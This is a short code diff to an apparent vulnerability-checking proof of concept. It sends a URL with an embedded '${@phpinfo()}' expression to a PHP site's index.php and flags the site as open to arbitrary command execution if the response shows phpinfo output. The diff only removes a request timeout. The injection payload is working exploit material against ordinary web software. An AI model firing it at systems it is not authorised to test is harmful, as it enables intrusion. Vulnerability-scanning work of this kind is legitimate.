@@ -45,7 +45,7 @@ class poc:
     def vuln(self, netloc, scheme):
         url = "{}://{}/index.php?s=/index/index/name/$%7B@phpinfo()%7D".format(scheme, netloc)
         try:
-            result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
             if "System" in result.text:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意命令执行漏洞\033[0m
